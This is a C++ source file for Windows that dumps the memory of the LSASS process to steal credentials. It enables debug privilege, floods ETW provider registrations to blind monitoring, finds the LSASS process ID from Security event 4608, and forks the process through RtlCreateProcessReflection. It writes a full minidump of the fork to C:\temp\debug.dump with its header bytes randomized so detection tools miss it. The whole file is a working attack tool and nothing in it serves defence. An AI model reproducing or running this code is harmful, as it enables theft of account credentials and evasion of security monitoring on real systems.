#include <iostream>    
#include <random>     

#include <Windows.h>   
#include <winevt.h>   
#include <evntprov.h>
#include <DbgHelp.h>   
#include <tlhelp32.h>  

#include "Header.h"   

#pragma comment(lib, "Dbghelp.lib") 
#pragma comment(lib, "wevtapi.lib")

LPVOID dBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 100);//分配100mb
DWORD bRead = 0;


BOOL CALLBACK minidumpCallback(
    __in     PVOID callbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;

    switch (callbackInput->CallbackType)
    {
    case IoStartCallback:
        callbackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback:
        callbackOutput->Status = S_OK;
        source = callbackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dBuf + (DWORD_PTR)callbackInput->Io.Offset);
        bufferSize = callbackInput->Io.BufferBytes;
        bRead += bufferSize;

        RtlCopyMemory(destination, source, bufferSize);

        break;

    case IoFinishCallback:
        callbackOutput->Status = S_OK;
        break;

    default:
        return true;
    }
    return TRUE;
}

//ETW patch
void Gluttony() {
    DWORD status = ERROR_SUCCESS;
    REGHANDLE RegistrationHandle = NULL;
    const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} };
    int count = 0;
    while (status = EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {
        count++;
    }
    //printf("%d\n", count);
}


DWORD EventPid()
{
    EVT_HANDLE hResults = NULL, hContext = NULL, hEvent = NULL;
    DWORD dwProcessId = 0;

    do {
        hResults = EvtQuery(NULL, L"Security", L"*[System[EventID=4608]]", EvtQueryChannelPath | EvtQueryTolerateQueryErrors);
        if (!hResults) {
            wprintf(L"EvtQuery failed: %s\n", GetLastError());
            break;
        }

        if (!EvtSeek(hResults, 0, NULL, 0, EvtSeekRelativeToLast)) {
            wprintf(L"EvtSeek failed: %s\n", GetLastError());
            break;
        }

        DWORD dwReturned = 0;
        if (!EvtNext(hResults, 1, &hEvent, INFINITE, 0, &dwReturned) || dwReturned != 1) {
            wprintf(L"EvtNext failed: %s\n", GetLastError());
            break;
        }

        LPCWSTR ppValues[] = { L"Event/System/Execution/@ProcessID" };
        hContext = EvtCreateRenderContext(1, ppValues, EvtRenderContextValues);
        if (!hContext) {
            wprintf(L"EvtCreateRenderContext failed: %s\n", GetLastError());
            break;
        }

        EVT_VARIANT pProcessId = { 0 };
        if (!EvtRender(hContext, hEvent, EvtRenderEventValues, sizeof(EVT_VARIANT), &pProcessId, &dwReturned, NULL)) {
            wprintf(L"EvtRender failed: %s\n", GetLastError());
            break;
        }

        dwProcessId = pProcessId.UInt32Val;
    } while (FALSE);

    if (hEvent) EvtClose(hEvent);
    if (hContext) EvtClose(hContext);
    if (hResults) EvtClose(hResults);

    return dwProcessId;
}

constexpr unsigned int numRNG() {
    const char* timeStr = __TIME__;
    unsigned int hash = '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;

    for (int i = 0; timeStr[i] != '\0'; ++i)
        hash = 31 * hash + timeStr[i];
    return hash;
}

constexpr unsigned long DJB2me(const char* str) {
    unsigned long hash = numRNG();
    while (int c = *str++) {
        hash = ((hash << 7) + hash) + c;
    }
    return hash;
}

VOID GenerateInvalidSignature(LPVOID dumpBuffer) {
    std::srand(numRNG());
    unsigned char* pBuffer = static_cast<unsigned char*>(dumpBuffer);

    for (int i = 0; i < 8; ++i) {
        pBuffer[i] = static_cast<unsigned char>(std::rand() % 256);
    }
}

BOOL InvokeMinidump()
{

    DWORD Pid = EventPid();
    if (Pid == NULL)
    {
        printf("LSASS Handler Error:%lu\n", GetLastError());
    }
    std::cout << "Lsass PID:" << Pid << std::endl;
    HANDLE LsassOpenhand = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);
    if (LsassOpenhand == NULL)
    {
        printf("fail Open lsass Error Code:%lu\n", GetLastError());
    }
    else
    {
        printf("Success Open lsass!\n");
    }

    HMODULE lib = LoadLibraryA("ntdll.dll");
    if (lib == NULL)
    {
        printf("Failed load Ndll.dll Error Code:%lu", GetLastError());
    }
    RtlCreateProcessReflectionFunc RtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)GetProcAddress(lib, "RtlCreateProcessReflection");
    if (!RtlCreateProcessReflection)
    {
        printf("Failed fetch RtlCreateProcessReflection Address Error Code:%lu\n", GetLastError());
    }
    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
    NTSTATUS reflectprocess = RtlCreateProcessReflection(LsassOpenhand, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);
    if (reflectprocess == STATUS_SUCCESS)
    {
        DWORD NewLsass = (DWORD)info.ReflectionClientId.UniqueProcess;
        std::cout << "New Lsass Pid:" << NewLsass << std::endl;
        HANDLE NewHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, NewLsass);
        if (NewHandle == NULL)
        {
            printf("Failed Openprocess Error Code:%lu\n", GetLastError());
        }
        std::cout << "New Lsass Create fork success" << std::endl;
        Sleep(5000);

        MINIDUMP_CALLBACK_INFORMATION callbackInfo;
        ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
        callbackInfo.CallbackRoutine = &minidumpCallback;
        callbackInfo.CallbackParam = NULL;

        if (MiniDumpWriteDump(NewHandle, NewLsass, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo) == FALSE)
        {
            printf("Failed to create a dump of the forked process \n");
            return 1;
        }
        std::cout << "Create success Dump for forked process\n" << std::endl;
        GenerateInvalidSignature(dBuf);
        LPCWSTR filePatch = L"C:\\temp\\debug.dump";
        DWORD fileAttributes = GetFileAttributesW(L"C:\\temp");
        if (fileAttributes == INVALID_FILE_ATTRIBUTES)
        {
            if (!CreateDirectoryW(L"C:\\temp", NULL)) {
                printf("Create C:\\temp first\n");
                return 1;
            }
        }
        HANDLE hFile = CreateFile(filePatch, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD bytesWritten = 0;
        BOOL wirteSuccess = WriteFile(hFile, dBuf, bRead, &bytesWritten, NULL);
        CloseHandle(hFile);
        HANDLE Newkill = OpenProcess(PROCESS_TERMINATE, FALSE, NewLsass);
        if (Newkill == NULL) 
        {
            std::cout << "File Openprocess Lsass Error Code:\n" << GetLastError() << std::endl;
        }
        if (!TerminateProcess(Newkill, 0)) 
        {
            printf("Failed to terminate new lsass.exe process Error Cdoe:%lu\n",GetLastError());
        }
        printf("New lsass.exe process kail \n");
    }
  
}
DWORD GetDebugPrivilege()
{
    BOOL fOk = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        fOk = (GetLastError() == ERROR_SUCCESS);
        CloseHandle(hToken);
        return 1;
    }
    return 0;
}

int main()
{
    GetDebugPrivilege();
    Gluttony();
    InvokeMinidump();

}